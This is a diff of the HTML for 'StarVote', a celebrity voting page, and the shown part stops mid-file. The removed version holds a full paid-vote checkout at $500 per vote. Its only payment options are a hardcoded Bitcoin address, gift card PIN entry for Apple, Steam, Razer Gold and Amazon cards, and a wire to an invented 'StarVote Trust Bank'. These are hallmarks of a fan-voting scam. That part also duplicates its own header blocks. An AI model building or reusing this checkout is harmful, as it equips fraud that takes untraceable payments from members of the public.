@@ -1,770 +1,523 @@
 <!DOCTYPE html>
-<html lang="en" class="scroll-smooth">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>StarVote — Celebrity Awards</title>
-    
-    <!-- Google Fonts: Plus Jakarta Sans & Inter -->
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
-    
-    <!-- Tailwind CSS CDN -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                        display: ['Plus Jakarta Sans', 'sans-serif'],
-                    },
-                    colors: {
-                        brand: {
-                            50: '#EFF6FF',
-                            100: '#DBEAFE',
-                            200: '#BFDBFE',
-                            500: '#3B82F6',
-                            600: '#2563EB',
-                            700: '#1D4ED8',
-                        }
-                    },
-                    boxShadow: {
-                        'soft': '0 2px 12px -2px rgba(15, 23, 42, 0.04), 0 0 0 1px rgba(226, 232, 240, 0.8)',
-                        'card-hover': '0 20px 38px -12px rgba(37, 99, 235, 0.14), 0 0 0 1px rgba(191, 219, 254, 1)',
-                        'modal': '0 25px 50px -12px rgba(15, 23, 42, 0.18)',
-                    }
-                }
-            }
-        }
-    </script>
-
-    <!-- Alpine.js CDN -->
-    <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.14.1/dist/cdn.min.js"></script>
-    
-    <!-- Lucide Icons CDN -->
-    <script src="https://unpkg.com/lucide@latest"></script>
-
-    <style>
-        [x-cloak] { display: none !important; }
-        .bg-grid-subtle {
-            background-size: 32px 32px;
-            background-image: radial-gradient(circle, rgba(37, 99, 235, 0.06) 1px, transparent 1px);
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>StarVote — Celebrity Voting</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    body {
+      font-family: 'Inter', sans-serif;
+      background-color: #ffffff;
+      color: #0f172a;
+    }
+    .dot-pattern {
+      background-image: radial-gradient(#e2e8f0 1px, transparent 1px);
+      background-size: 24px 24px;
+    }
+    [x-cloak] {
+      display: none !important;
+    }
+    /* Remove default number input arrows */
+    input[type="number"]::-webkit-inner-spin-button,
+    input[type="number"]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    input[type="number"] {
+      -moz-appearance: textfield;
+    }
+  </style>
 </head>
-<body class="bg-white bg-grid-subtle text-slate-900 font-sans antialiased selection:bg-blue-100 selection:text-blue-700 min-h-screen flex flex-col"
-      x-data="celebVoteApp()"
+<body class="min-h-screen flex flex-col antialiased selection:bg-blue-100 selection:text-blue-700"
+      x-data="starVoteApp()"
       x-init="initIcons()">
 
-    <!-- Minimal Glassmorphic Top Navigation Bar -->
-    <header class="sticky top-0 z-40 bg-white/80 backdrop-blur-xl border-b border-slate-200/70">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 sm:h-20 flex items-center justify-between">
-            <!-- Brand Logo -->
-            <a href="#" class="flex items-center gap-3 group focus:outline-none">
-                <div class="w-9 h-9 rounded-xl bg-gradient-to-tr from-blue-600 to-blue-500 flex items-center justify-center text-white shadow-sm shadow-blue-600/20 group-hover:scale-105 transition-transform duration-200">
-                    <i data-lucide="sparkles" class="w-4.5 h-4.5"></i>
-                </div>
-                <div class="flex items-center gap-2">
-                    <span class="font-display font-extrabold text-xl tracking-tight text-slate-900">
-                        Star<span class="text-blue-600">Vote</span>
-                    </span>
-                    <span class="hidden sm:inline-flex items-center px-2 py-0.5 rounded-md text-[11px] font-semibold tracking-wide uppercase bg-slate-100 text-slate-600 border border-slate-200/70">
-                        2026
-                    </span>
-                </div>
-            </a>
-
-            <!-- Subtle Live Vote Counter & Paid Ballot Pill -->
-            <div class="flex items-center gap-2.5 px-3.5 py-1.5 rounded-full bg-white border border-slate-200/90 shadow-xs text-slate-700 text-xs sm:text-sm font-medium">
-                <span class="relative flex h-2 w-2">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-500 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-600"></span>
-                </span>
-                <span class="text-slate-500 hidden xs:inline">Verified Ballot</span>
-                <span class="text-slate-200 hidden xs:inline">|</span>
-                <span class="font-semibold text-blue-600 tabular-nums" x-text="formatNumber(totalVotes) + ' Votes'"></span>
-            </div>
+  <!-- Top Navigation Header -->
+  <header class="sticky top-0 z-30 bg-white/85 backdrop-blur-md border-b border-slate-100">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between">
+      <a href="#" class="flex items-center gap-2.5 group">
+        <div class="w-9 h-9 rounded-xl bg-blue-600 text-white flex items-center justify-center shadow-sm shadow-blue-600/20 group-hover:bg-blue-700 transition">
+          <i data-lucide="sparkles" class="w-4 h-4"></i>
         </div>
-    </header>
+        <span class="font-bold text-lg tracking-tight text-slate-900">
+          Star<span class="text-blue-600">Vote</span>
+        </span>
+      </a>
 
-    <!-- Main Content Area -->
-    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-16">
-        
-        <!-- Refined 2026 Editorial Header -->
-        <div class="flex flex-col md:flex-row md:items-end justify-between gap-6 mb-10 sm:mb-12">
-            <div class="max-w-2xl">
-            <!-- Subtle Live Vote Counter Pill -->
-            <div class="flex items-center gap-2.5 px-3.5 py-1.5 rounded-full bg-white border border-slate-200/90 shadow-xs text-slate-700 text-xs sm:text-sm font-medium">
-                <span class="relative flex h-2 w-2">
-                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-blue-500 opacity-75"></span>
-                    <span class="relative inline-flex rounded-full h-2 w-2 bg-blue-600"></span>
-                </span>
-                <span class="text-slate-500 hidden xs:inline">Live Voting</span>
-                <span class="text-slate-200 hidden xs:inline">|</span>
-                <span class="font-semibold text-blue-600 tabular-nums" x-text="formatNumber(totalVotes) + ' Votes'"></span>
-            </div>
+      <div class="flex items-center gap-3">
+        <div class="hidden sm:flex items-center gap-2 px-3 py-1.5 rounded-full bg-blue-50/80 border border-blue-100 text-xs font-medium text-blue-700">
+          <span class="w-1.5 h-1.5 rounded-full bg-blue-600 animate-pulse"></span>
+          <span>2026 Live Poll</span>
         </div>
-    </header>
-
-    <!-- Main Content Area -->
-    <main class="flex-grow max-w-7xl w-full mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-16">
-        
-        <!-- Refined 2026 Editorial Header -->
-        <div class="mb-10 sm:mb-12 max-w-2xl">
-            <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-50 border border-blue-100 text-blue-700 text-xs font-semibold tracking-wide mb-4">
-                <i data-lucide="shield-check" class="w-3.5 h-3.5"></i>
-                <span>Official 2026 Public Voting</span>
-            </div>
-            <h1 class="font-display text-3xl sm:text-4xl lg:text-[2.75rem] font-extrabold tracking-tight text-slate-900 leading-[1.12]">
-                People’s Choice Nominees
-            </h1>
-            <p class="mt-3 text-slate-500 text-base sm:text-lg leading-relaxed">
-                Support your favorite talent. Select a nominee below to submit your official vote.
-            </p>
+        <div class="flex items-center gap-1.5 px-3.5 py-1.5 rounded-full bg-slate-50 border border-slate-200/80 text-xs font-semibold text-slate-700">
+          <i data-lucide="bar-chart-2" class="w-3.5 h-3.5 text-blue-600"></i>
+          <span x-text="totalVotes.toLocaleString() + ' Total Votes'"></span>
         </div>
-
-        <!-- Bento-Style Celebrity Grid -->
-        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6">
-            <template x-for="celeb in celebrities" :key="celeb.id">
-                <article class="group bg-white rounded-[24px] border border-slate-200/80 p-2.5 shadow-sm hover:shadow-xl hover:shadow-blue-950/[0.06] hover:border-blue-200/80 transition-all duration-300 flex flex-col">
-                    
-                    <!-- Rounded Inner Portrait Frame -->
-                    <div class="relative aspect-[4/5] w-full rounded-2xl overflow-hidden bg-slate-100">
-                        <img :src="celeb.image" 
-                             :alt="celeb.name"
-                             loading="lazy"
-                             onerror="this.src='https://placehold.co/600x750/EFF6FF/2563EB?text=Nominee'"
-                             class="w-full h-full object-cover object-center group-hover:scale-[1.04] transition-transform duration-500 ease-out">
-                        
-                        <!-- Subtle Bottom Gradient Scrim for Contrast -->
-                        <div class="absolute inset-x-0 bottom-0 h-24 bg-gradient-to-t from-slate-950/45 via-transparent to-transparent opacity-70"></div>
-
-                        <!-- Top Floating Glass Vote Tally Badge -->
-                        <div class="absolute top-3 right-3 px-2.5 py-1 rounded-full bg-white/90 backdrop-blur-md border border-white/60 shadow-xs flex items-center gap-1.5 text-xs font-semibold text-slate-800 tabular-nums">
-                            <span class="w-1.5 h-1.5 rounded-full bg-blue-600"></span>
-                            <span x-text="formatNumber(celeb.votes)"></span>
-                        </div>
-
-                        <!-- Bottom Left Category Tag -->
-                        <div class="absolute bottom-3 left-3">
-                            <span class="px-2.5 py-1 rounded-lg bg-white/90 backdrop-blur-md text-[11px] font-semibold tracking-wide text-slate-800 shadow-xs" x-text="celeb.role"></span>
-                        </div>
-                    </div>
-
-                    <!-- Card Details & Paid Vote Action -->
-                    <div class="px-2.5 pt-4 pb-2 flex flex-col flex-grow justify-between gap-4">
-                        <div class="flex items-center justify-between gap-2">
-                            <div class="flex items-center gap-1.5 min-w-0">
-                                <h2 class="font-display text-[17px] font-bold text-slate-900 truncate" x-text="celeb.name"></h2>
-                                <!-- Verified Nominee Checkmark -->
-                                <svg class="w-4 h-4 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="currentColor" aria-label="Verified Nominee">
-                                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"/>
-                                </svg>
-                            </div>
-                            <div class="flex items-center gap-1.5 shrink-0">
-                                <span x-show="celeb.userVotes > 0"
-                                      x-cloak
-                                      class="px-2 py-0.5 rounded-full bg-blue-50 text-blue-700 border border-blue-200/80 text-[10px] font-bold tabular-nums"
-                                      x-text="'+' + celeb.userVotes + ' Yours'"></span>
-                                <span class="text-[11px] font-medium text-slate-400" x-text="'#' + String(celeb.id).padStart(2, '0')"></span>
-                            </div>
-                        </div>
-
-                        <!-- Vote Button (Credit Card / Payment Icon, Zero Price Displayed) -->
-                        <button type="button"
-                                @click="openVoteModal(celeb)"
-                                :class="celeb.voted 
-                                    ? 'bg-blue-50 text-blue-700 border-blue-200/90 hover:bg-blue-100/70' 
-                                    : 'bg-blue-600 text-white border-transparent hover:bg-blue-700 shadow-sm shadow-blue-600/15'"
-                                class="w-full py-3 px-4 rounded-2xl border font-semibold text-sm flex items-center justify-center gap-2 transition-all duration-200 active:scale-[0.98] focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 cursor-pointer">
-                            
-                            <!-- Sleek Credit Card Icon -->
-                            <svg class="w-4 h-4 shrink-0" :class="celeb.voted ? 'text-blue-600' : 'text-blue-100'" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                <rect width="20" height="14" x="2" y="5" rx="2.5"></rect>
-                                <line x1="2" x2="22" y1="10" y2="10"></line>
-                                <line x1="6" x2="10" y1="15" y2="15"></line>
-                            </svg>
-
-                            <span x-text="celeb.voted ? 'Vote Again' : 'Vote'"></span>
-                        </button>
-                    </div>
-                </article>
-            </template>
-        </div>
-    </main>
-
-    <!-- 2026 Checkout & Vote Confirmation Modal -->
-    <div x-show="modal.open"
-         x-cloak
-         @keydown.escape.window="closeModal()"
-         class="fixed inset-0 z-50 flex items-end sm:items-center justify-center p-3 sm:p-6 overflow-y-auto">
-        
-        <!-- Backdrop -->
-        <div x-show="modal.open"
-             x-transition:enter="transition ease-out duration-200"
-             x-transition:enter-start="opacity-0"
-             x-transition:enter-end="opacity-100"
-             x-transition:leave="transition ease-in duration-150"
-             x-transition:leave-start="opacity-100"
-             x-transition:leave-end="opacity-0"
-             @click="closeModal()"
-             class="fixed inset-0 bg-slate-900/40 backdrop-blur-xs"></div>
-
-        <!-- Modal Card -->
-        <div x-show="modal.open"
-             x-transition:enter="transition ease-out duration-250"
-             x-transition:enter-start="opacity-0 translate-y-6 sm:translate-y-2 sm:scale-95"
-             x-transition:enter-end="opacity-100 translate-y-0 sm:scale-100"
-             x-transition:leave="transition ease-in duration-150"
-             x-transition:leave-start="opacity-100 translate-y-0 sm:scale-100"
-             x-transition:leave-end="opacity-0 translate-y-6 sm:translate-y-2 sm:scale-95"
-             class="relative w-full max-w-lg bg-white rounded-3xl border border-slate-200/90 shadow-modal p-5 sm:p-7 z-10 my-auto max-h-[92vh] overflow-y-auto">
-            
-            <!-- Modal Header -->
-            <div class="flex items-center justify-between mb-4">
-                <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-blue-50 text-blue-700 text-xs font-semibold">
-                    <svg class="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                        <rect width="20" height="14" x="2" y="5" rx="2.5"></rect>
-                        <line x1="2" x2="22" y1="10" y2="10"></line>
-                    </svg>
-                    <span>Vote Checkout</span>
-                </div>
-                <button type="button" @click="closeModal()" class="w-8 h-8 rounded-full flex items-center justify-center text-slate-400 hover:text-slate-700 hover:bg-slate-100 transition-colors cursor-pointer" aria-label="Close modal">
-                    <svg class="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                        <line x1="18" y1="6" x2="6" y2="18"></line>
-                        <line x1="6" y1="6" x2="18" y2="18"></line>
-                    </svg>
-                </button>
-            </div>
-
-            <!-- Selected Celebrity & Checkout Flow -->
-            <template x-if="modal.celeb">
-                <div class="space-y-4">
-                    <!-- Selected Celebrity Summary -->
-                    <div class="flex items-center gap-3.5 p-3 rounded-2xl bg-slate-50/90 border border-slate-200/70">
-                        <img :src="modal.celeb.image" :alt="modal.celeb.name" class="w-14 h-14 rounded-xl object-cover shrink-0 border border-white shadow-xs">
-                        <div class="min-w-0 flex-grow">
-                            <span class="text-[11px] font-semibold uppercase tracking-wider text-blue-600" x-text="modal.celeb.role"></span>
-                            <div class="flex items-center gap-1.5">
-                                <h3 class="font-display text-base sm:text-lg font-bold text-slate-900 truncate" x-text="modal.celeb.name"></h3>
-                                <svg class="w-4 h-4 text-blue-600 shrink-0" viewBox="0 0 24 24" fill="currentColor">
-                                    <path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-1.9 14.7L6 12.6l1.5-1.5 2.6 2.6 6.4-6.4 1.5 1.5-7.9 7.9z"/>
-                                </svg>
-                            </div>
-                            <p class="text-xs text-slate-500 tabular-nums">
-                                Current standing: <span class="font-semibold text-slate-700" x-text="formatNumber(modal.celeb.votes) + ' votes'"></span>
-                            </p>
-                        </div>
-                    </div>
-
-                    <!-- Vote Quantity Selector -->
-                    <div>
-                        <div class="flex items-center justify-between mb-2">
-                            <label class="text-xs font-semibold uppercase tracking-wider text-slate-500">Select Number of Votes</label>
-                            <span class="text-xs font-semibold text-blue-600">$500 / vote</span>
-                        </div>
-
-                        <!-- Quick-Select Pills + Numeric Stepper -->
-                        <div class="flex flex-col sm:flex-row items-stretch sm:items-center gap-2.5">
-                            <div class="grid grid-cols-4 gap-1.5 flex-grow">
-                                <template x-for="preset in [1, 2, 5, 10]" :key="preset">
-                                    <button type="button"
-                                            @click="modal.quantity = preset"
-                                            :class="Number(modal.quantity) === preset 
-                                                ? 'bg-blue-600 text-white border-blue-600 shadow-xs' 
-                                                : 'bg-white text-slate-700 border-slate-200 hover:border-blue-300 hover:bg-blue-50/50'"
-                                            class="py-2.5 px-2 rounded-xl border text-xs font-bold tabular-nums transition-all cursor-pointer"
-                                            x-text="preset + (preset === 1 ? ' Vote' : ' Votes')">
-                                    </button>
-                                </template>
-                            </div>
-
-                            <!-- Stepper & Custom Input -->
-                            <div class="flex items-center justify-between sm:justify-start rounded-xl border border-slate-200 bg-slate-50/70 p-1 shrink-0">
-                                <button type="button"
-                                        @click="decrementQuantity()"
-                                        :disabled="modal.quantity <= 1"
-                                        class="w-8 h-8 rounded-lg bg-white border border-slate-200/80 text-slate-700 hover:bg-slate-100 disabled:opacity-40 flex items-center justify-center font-bold transition-colors cursor-pointer"
-                                        aria-label="Decrease votes">
-                                    -
-                                </button>
-                                <input type="number"
-                                       min="1"
-                                       max="10000"
-                                       x-model.number="modal.quantity"
-                                       @blur="sanitizeQuantity()"
-                                       @change="sanitizeQuantity()"
-                                       aria-label="Custom vote count"
-                                       class="w-16 text-center bg-transparent font-display font-bold text-sm text-slate-900 focus:outline-none tabular-nums">
-                                <button type="button"
-                                        @click="incrementQuantity()"
-                                        class="w-8 h-8 rounded-lg bg-white border border-slate-200/80 text-slate-700 hover:bg-slate-100 flex items-center justify-center font-bold transition-colors cursor-pointer"
-                                        aria-label="Increase votes">
-                                    +
-                                </button>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Payment Method Selection (3 Options: Bitcoin, Giftcard, Bank Transfer) -->
-                    <div>
-                        <label class="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-2">Payment Method</label>
-                        <div class="grid grid-cols-3 gap-2.5">
-                            <!-- 1. Bitcoin -->
-                            <button type="button"
-                                    @click="modal.paymentMethod = 'bitcoin'"
-                                    :class="modal.paymentMethod === 'bitcoin' 
-                                        ? 'border-blue-600 bg-blue-50/60 ring-2 ring-blue-600/15 text-blue-700' 
-                                        : 'border-slate-200 bg-white hover:border-slate-300 text-slate-700'"
-                                    class="relative p-3 rounded-2xl border flex flex-col items-center justify-center gap-1.5 text-center transition-all cursor-pointer">
-                                <div :class="modal.paymentMethod === 'bitcoin' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
-                                     class="w-9 h-9 rounded-xl flex items-center justify-center transition-colors">
-                                    <!-- Bitcoin Icon -->
-                                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                        <path d="M11.767 19.089c4.924.868 6.14-6.025 1.216-6.894m-1.216 6.894L5.86 18.047m5.908 1.042-.347 1.97m1.563-8.864c4.924.869 6.14-6.025 1.215-6.893m-1.215 6.893-3.94-.694m5.155-6.2L8.29 4.26m5.908 1.042.348-1.97M7.48 20.364l3.126-17.727"/>
-                                    </svg>
-                                </div>
-                                <span class="text-xs font-bold">Bitcoin</span>
-                            </button>
-
-                            <!-- 2. Giftcard -->
-                            <button type="button"
-                                    @click="modal.paymentMethod = 'giftcard'"
-                                    :class="modal.paymentMethod === 'giftcard' 
-                                        ? 'border-blue-600 bg-blue-50/60 ring-2 ring-blue-600/15 text-blue-700' 
-                                        : 'border-slate-200 bg-white hover:border-slate-300 text-slate-700'"
-                                    class="relative p-3 rounded-2xl border flex flex-col items-center justify-center gap-1.5 text-center transition-all cursor-pointer">
-                                <div :class="modal.paymentMethod === 'giftcard' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
-                                     class="w-9 h-9 rounded-xl flex items-center justify-center transition-colors">
-                                    <!-- Giftcard Icon -->
-                                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                        <rect x="3" y="8" width="18" height="4" rx="1"/>
-                                        <path d="M12 8v13"/>
-                                        <path d="M19 12v7a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2v-7"/>
-                                        <path d="M7.5 8a2.5 2.5 0 0 1 0-5A4.8 8 0 0 1 12 8a4.8 8 0 0 1 4.5-5 2.5 2.5 0 0 1 0 5"/>
-                                    </svg>
-                                </div>
-                                <span class="text-xs font-bold">Giftcard</span>
-                            </button>
-
-                            <!-- 3. Bank Transfer -->
-                            <button type="button"
-                                    @click="modal.paymentMethod = 'bank'"
-                                    :class="modal.paymentMethod === 'bank' 
-                                        ? 'border-blue-600 bg-blue-50/60 ring-2 ring-blue-600/15 text-blue-700' 
-                                        : 'border-slate-200 bg-white hover:border-slate-300 text-slate-700'"
-                                    class="relative p-3 rounded-2xl border flex flex-col items-center justify-center gap-1.5 text-center transition-all cursor-pointer">
-                                <div :class="modal.paymentMethod === 'bank' ? 'bg-blue-600 text-white' : 'bg-slate-100 text-slate-600'"
-                                     class="w-9 h-9 rounded-xl flex items-center justify-center transition-colors">
-                                    <!-- Bank / Landmark Icon -->
-                                    <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                                        <line x1="3" x2="21" y1="22" y2="22"/>
-                                        <line x1="6" x2="6" y1="18" y2="11"/>
-                                        <line x1="10" x2="10" y1="18" y2="11"/>
-                                        <line x1="14" x2="14" y1="18" y2="11"/>
-                                        <line x1="18" x2="18" y1="18" y2="11"/>
-                                        <polygon points="12 2 20 7 4 7"/>
-                                    </svg>
-                                </div>
-                                <span class="text-xs font-bold">Bank Transfer</span>
-                            </button>
-                        </div>
-                    </div>
-
-                    <!-- Dynamic Payment Details Box -->
-                    <div class="p-3.5 rounded-2xl bg-slate-50 border border-slate-200/80 text-xs">
-                        <!-- Bitcoin Payment Instructions -->
-                        <div x-show="modal.paymentMethod === 'bitcoin'" class="space-y-2">
-                            <div class="flex items-center justify-between">
-                                <span class="font-semibold text-slate-800">BTC Network Wallet Address</span>
-                                <span class="px-2 py-0.5 rounded-md bg-amber-50 text-amber-700 font-semibold text-[10px]">BTC (SegWit)</span>
-                            </div>
-                            <div class="flex items-center gap-2 bg-white border border-slate-200 rounded-xl px-3 py-2">
-                                <code id="btc-wallet-text" class="text-[11px] font-mono text-slate-700 truncate flex-grow select-all">bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code>
-                                <button type="button"
-                                        @click="copyText('bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 'BTC Address')"
-                                        class="px-2.5 py-1 rounded-lg bg-blue-50 hover:bg-blue-100 text-blue-700 font-semibold text-[11px] shrink-0 transition-colors cursor-pointer">
-                                    <span x-text="modal.copiedField === 'BTC Address' ? 'Copied!' : 'Copy'"></span>
-                                </button>
-                            </div>
-                            <p class="text-[11px] text-slate-500">Send exact USD equivalent of <span class="font-semibold text-slate-800" x-text="formatCurrency(checkoutTotal)"></span>, then click confirm below.</p>
-                        </div>
-
-                        <!-- Giftcard Payment Instructions -->
-                        <div x-show="modal.paymentMethod === 'giftcard'" class="space-y-2.5">
-                            <div class="flex items-center justify-between">
-                                <span class="font-semibold text-slate-800">Redeem Giftcard Voucher</span>
-                                <span class="text-[11px] text-slate-500">Instant verification</span>
-                            </div>
-                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
-                                <select x-model="modal.giftcardBrand"
-                                        aria-label="Select Giftcard Brand"
-                                        class="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs font-medium text-slate-800 focus:outline-none focus:border-blue-500">
-                                    <option value="Apple / iTunes">Apple / iTunes</option>
-                                    <option value="Steam Wallet">Steam Wallet</option>
-                                    <option value="Razer Gold">Razer Gold</option>
-                                    <option value="Amazon Gift Card">Amazon Gift Card</option>
-                                    <option value="Visa / Amex Prepaid">Visa / Amex Prepaid</option>
-                                </select>
-                                <input type="text"
-                                       x-model="modal.giftcardCode"
-                                       placeholder="Enter card PIN / code"
-                                       class="w-full rounded-xl border border-slate-200 bg-white px-3 py-2 text-xs font-mono text-slate-800 placeholder:text-slate-400 focus:outline-none focus:border-blue-500">
-                            </div>
-                        </div>
-
-                        <!-- Bank Transfer Payment Instructions -->
-                        <div x-show="modal.paymentMethod === 'bank'" class="space-y-2">
-                            <div class="flex items-center justify-between">
-                                <span class="font-semibold text-slate-800">Official Wire / Bank Transfer</span>
-                                <button type="button"
-                                        @click="copyText('8849201948', 'Account Number')"
-                                        class="text-blue-600 hover:text-blue-700 font-semibold text-[11px] cursor-pointer">
-                                    <span x-text="modal.copiedField === 'Account Number' ? 'Copied Acct #' : 'Copy Acct #'"></span>
-                                </button>
-                            </div>
-                            <div class="grid grid-cols-2 gap-2 bg-white border border-slate-200 rounded-xl p-2.5 text-[11px]">
-                                <div>
-                                    <span class="text-slate-400 block">Bank Name</span>
-                                    <span class="font-semibold text-slate-800">StarVote Trust Bank</span>
-                                </div>
-                                <div>
-                                    <span class="text-slate-400 block">Account Number</span>
-                                    <span class="font-mono font-semibold text-slate-800">8849201948</span>
-                                </div>
-                                <div>
-                                    <span class="text-slate-400 block">Routing / SWIFT</span>
-                                    <span class="font-mono font-semibold text-slate-800">SVTBUS33</span>
-                                </div>
-                                <div>
-                                    <span class="text-slate-400 block">Beneficiary</span>
-                                    <span class="font-semibold text-slate-800">StarVote Awards Inc.</span>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-
-                    <!-- Checkout Summary Box -->
-                    <div class="p-4 rounded-2xl bg-blue-50/70 border border-blue-200/80 space-y-2">
-                        <div class="flex items-center justify-between text-xs text-slate-600">
-                            <span>Vote Allocation</span>
-                            <span class="font-semibold text-slate-800 tabular-nums" x-text="safeQuantity + (safeQuantity === 1 ? ' Vote × $500' : ' Votes × $500')"></span>
-                        </div>
-                        <div class="flex items-center justify-between text-xs text-slate-600">
-                            <span>Payment Method</span>
-                            <span class="font-semibold text-slate-800 capitalize" x-text="paymentMethodLabel"></span>
-                        </div>
-                        <div class="pt-2 border-t border-blue-200/80 flex items-center justify-between">
-                            <span class="text-sm font-bold text-slate-900">Total Checkout</span>
-                            <span class="font-display text-xl font-extrabold text-blue-600 tabular-nums" x-text="formatCurrency(checkoutTotal)"></span>
-                        </div>
-                    </div>
-
-                    <!-- Action Buttons -->
-                    <div class="flex items-center gap-3 pt-1">
-                        <button type="button"
-                                @click="closeModal()"
-                                class="w-1/3 py-3.5 px-4 rounded-2xl border border-slate-200 text-slate-600 hover:bg-slate-50 font-semibold text-sm transition-colors cursor-pointer">
-                            Cancel
-                        </button>
-                        <button type="button"
-                                @click="confirmVote()"
-                                :disabled="modal.processing"
-                                class="w-2/3 py-3.5 px-4 rounded-2xl bg-blue-600 hover:bg-blue-700 disabled:opacity-75 text-white font-semibold text-sm flex items-center justify-center gap-2 shadow-sm shadow-blue-600/20 transition-all cursor-pointer">
-                            <template x-if="!modal.processing">
-                                <span class="flex items-center gap-2 tabular-nums">
-                                    <svg class="w-4 h-4 text-blue-100" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
-                                        <rect width="20" height="14" x="2" y="5" rx="2.5"></rect>
-                                        <line x1="2" x2="22" y1="10" y2="10"></line>
-                                    </svg>
-                                    <span x-text="'Confirm & Pay ' + formatCurrency(checkoutTotal)"></span>
-                                </span>
-                            </template>
-                            <template x-if="modal.processing">
-                                <span class="flex items-center gap-2">
-                                    <svg class="animate-spin w-4 h-4 text-white" viewBox="0 0 24 24" fill="none">
-                                        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
-                                        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"></path>
-                                    </svg>
-                                    <span>Processing...</span>
-                                </span>
-                            </template>
-                        </button>
-                    </div>
-                </div>
-            </template>
-        </div>
+      </div>
     </div>
+  </header>
 
-    <!-- Sleek Minimal Blue & White Confirmation Toast -->
-    <div x-show="toast.visible"
-         x-cloak
-         x-transition:enter="transition ease-out duration-300"
-         x-transition:enter-start="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
-         x-transition:enter-end="opacity-100 translate-y-0 sm:scale-100"
-         x-transition:leave="transition ease-in duration-200"
-         x-transition:leave-start="opacity-100 translate-y-0 sm:scale-100"
-         x-transition:leave-end="opacity-0 translate-y-4 sm:translate-y-0 sm:scale-95"
-         class="fixed bottom-5 right-5 left-5 sm:left-auto sm:w-96 z-50 bg-white/95 backdrop-blur-md border border-blue-200 rounded-2xl shadow-xl p-4 flex items-center gap-3.5">
-        <div class="w-10 h-10 rounded-xl bg-blue-600 text-white flex items-center justify-center shrink-0 shadow-xs">
-            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                <polyline points="20 6 9 17 4 12"></polyline>
-            </svg>
+  <!-- Main Content -->
+  <main class="flex-1 dot-pattern">
+    <div class="max-w-6xl mx-auto px-4 sm:px-6 py-10 sm:py-14">
+
+      <!-- Clean Hero Title -->
+      <div class="max-w-2xl mb-10">
+        <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full bg-blue-50 text-blue-600 text-xs font-semibold mb-3">
+          <i data-lucide="award" class="w-3.5 h-3.5"></i>
+          <span>Official Nominees</span>
         </div>
-        <div class="flex-grow min-w-0">
